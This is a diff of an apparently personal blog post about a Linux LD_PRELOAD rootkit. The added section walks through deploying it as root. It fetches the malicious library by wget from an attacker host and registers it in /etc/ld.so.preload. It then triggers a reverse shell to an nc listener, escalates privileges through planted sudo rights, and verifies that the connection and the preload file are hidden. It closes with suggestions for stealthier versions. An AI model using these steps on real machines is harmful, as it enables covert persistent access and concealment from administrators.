@@ -470,6 +470,109 @@ We can go through it piece by piece:
 
 With this setup, we can hide arbitrary files from `/bin/ls`. 
 
+## Actually Using the Damn Rootkit
+Let's actually use this thing. Let's pretend we're root on our victim machine, and it's time to install the malicious library. 
+
+1. Let's set all the definitions specific for the victim host and compile the library. Let's give it a non-descriptive name, something that will blend in to the naked eye. (And let's put "man" in the file name because Manteau). Let's compile our C file with: `gcc -ldl manteau.c -fPIC -shared -D_GNU_SOURCE -o libc.man.so.6`
+2. Let's `wget` that to the victim, in our case an i386 Ubuntu machine running SSH.
+```
+root@ubuntu:/home/manteau# wget http://192.168.1.218/libc.man.so.6
+```
+3. Let's move it to the correct library that other shared libaries reside, on our victim that's in `/lib/i386-linux-gnu/`
+```
+root@ubuntu:/home/manteau# mv libc.man.so.6 /lib/i386-linux-gnu/libc.man.so.6
+```
+4. Let's now put a reference to our malicious shared library in the `/etc/ld.so.preload` file.
+```
+root@ubuntu:/home/manteau# echo "/lib/i386-linux-gnu/libc.man.so.6" > /etc/ld.so.preload
+```
+5. Let's check that it took by using `ldd` on something like `/bin/ls` and see if our malicious library is the first shared library loaded into memory.
+```
+root@ubuntu:/home/manteau# ldd /bin/ls
+	linux-gate.so.1 =>  (0xb7f06000)
+	/lib/i386-linux-gnu/libc.man.so.6 (0xb7efc000)
+	libselinux.so.1 => /lib/i386-linux-gnu/libselinux.so.1 (0xb7ec0000)
+	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7d0a000)
+	libdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xb7d05000)
+	libpcre.so.3 => /lib/i386-linux-gnu/libpcre.so.3 (0xb7c90000)
+	/lib/ld-linux.so.2 (0xb7f08000)
+	libpthread.so.0 => /lib/i386-linux-gnu/libpthread.so.0 (0xb7c73000)
+```
+6. Hell yes. It worked. Ours is the second entry. Let's restart syslog and then get a connection. We'll use the trigger for plaintext reverse shell on port 443 on our attacker. 
+```
+root@ubuntu:/home/manteau# systemctl restart ssh
+```
+7. Start a listener, and send our trigger.
+```
+tokyo:~/LearningC/ # nc -lvp 443 -4                                                                                                      Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on 0.0.0.0:443
+```
+```
+tokyo:~/LearningC/ # ssh reverseshell4@192.168.1.192               
+reverseshell4@192.168.1.192's password: 
+```
+```
+tokyo:~/LearningC/ # nc -lvp 443                                   
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 192.168.1.192.
+Ncat: Connection from 192.168.1.192:65065.
+```
+8. Let's use our sudo privs we left ourselves and escalate to root real quick
+```
+id
+uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
+sudo su
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+9. Let's check `netstat` for our malicious connection on the victim,
+```
+root@ubuntu:/home/caz# netstat -ano | grep -v unix
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+udp        0      0 127.0.1.1:53            0.0.0.0:*                           off (0.00/0/0)
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           off (0.00/0/0)
+udp        0      0 0.0.0.0:631             0.0.0.0:*                           off (0.00/0/0)
+udp        0      0 0.0.0.0:43212           0.0.0.0:*                           off (0.00/0/0)
+udp        0      0 0.0.0.0:5353            0.0.0.0:*                           off (0.00/0/0)
+udp        0      0 0.0.0.0:33102           0.0.0.0:*                           off (0.00/0/0)
+udp6       0      0 :::52795                :::*                                off (0.00/0/0)
+udp6       0      0 :::5353                 :::*                                off (0.00/0/0)
+raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
+Active UNIX domain sockets (servers and established)
+Proto RefCnt Flags       Type       State         I-Node   Path
+```
+10. Awesome. Our connection on local port `65065` is not shown. Let's try looking in `/etc` for `/etc/ld.so.preload` which was the file I chose to hide.
+```
+root@ubuntu:/home/caz# ls -lah /etc
+-----snip-----
+-rw-r--r--   1 root root    110 Feb 20  2019 kernel-img.conf
+-rw-r--r--   1 root root   1.3K Mar 10  2016 kerneloops.conf
+drwxr-xr-x   2 root root   4.0K Sep 22 06:46 ldap
+-rw-r--r--   1 root root    88K Oct  1 18:40 ld.so.cache
+-rw-r--r--   1 root root     34 Jan 27  2016 ld.so.conf
+drwxr-xr-x   2 root root   4.0K Jun  1 12:18 ld.so.conf.d
+-rw-r--r--   1 root root    267 Oct 22  2015 legal
+-rw-r--r--   1 root root     27 Jan  7  2015 libao.conf
+-rw-r--r--   1 root root    191 Jan 18  2016 libaudit.conf
+-----snip-----
+```
+11. Finally, `/etc/ld.so.preload` is hidden and this is good because I think on most systems it wouldn't exist. 
+
+## Potential Upgrades for the Library
+If you liked this post, and you want to take the library further, I have some ideas on what can be improved:
++ Get rid of the `syslog` trigger, and develop a trigger for the `sshd` service itself, that way we can get on the box as root without any privesc bread crumbs
++ Code up an `openssl` back connect client/server program so we can get encrypted comms
++ Do away with the magic port number hook and instead implement a magic `GID` which you can set as root on the processes you run
++ Extra Bonus: Patch the dynamic linker so that it doesn't reference /etc/ld.so.preload but silently references a different directory which you have hidden. The dynamic linker should still report that it checks /etc/ld.so.preload but we will know better :) 
+
+## Conclusion
+With some creative thinking and copy/paste, we were able to do quite a lot of bad things with some simple C. A lot of systems programming is done in C. If we want to get good at binary exploitation, reverse engineering, vulnerability research, etc., we're going to have to be comfortable with C. 
+
+Outside of my solution for hiding from `netstat`, a lot of these ideas have been done before and I leaned heavily on reference material. I'll include a resources section at the bottom. 
+
 ## Complete Malicious Library 
 ```c
 #include <stdio.h>
@@ -791,7 +894,17 @@ FILE *fopen(const char *pathname, const char *mode)
 }
 ```
 
-## Actually Using the Damn Rootkit
+## References
+I apologize if I left anyone off, writing this thing was a blur, I had so many tabs open that they barely could fit favicons on them. 
 
-
-
++ [/bin/ls explanation](https://gist.github.com/amitsaha/8169242)
++ [lsof guide](https://danielmiessler.com/study/lsof/)
++ [ephermeral port allocation](https://idea.popcount.org/2014-04-03-bind-before-connect/)
++ [Jynx explainer](http://www.infosecisland.com/blogview/22440-Analyzing-Jynx-and-LDPRELOAD-Based-Rootkits.html)
++ [userland LD_PRELOAD rootkits](https://ketansingh.net/overview-on-linux-userland-rootkits/)
++ [hooking shared library functions](https://blog.netspi.com/function-hooking-part-i-hooking-shared-library-function-calls-in-linux/)
++ [socket programming in C](http://www.cs.rpi.edu/~moorthy/Courses/os98/Pgms/socket.html)
++ [@epi052 socket programming recommendation](http://www.cs.rpi.edu/~moorthy/Courses/os98/Pgms/socket.html)
++ [Jynx2 source code](https://github.com/chokepoint/Jynx2/blob/master/jynx2.c)
++ [ipv6 socket programming](https://deceiveyour.team/2018/08/26/tcp-ipv4-and-ipv6-reverse-shell/)
++ [iamrastating socket programming](https://rastating.github.io/creating-a-bind-shell-tcp-shellcode/)
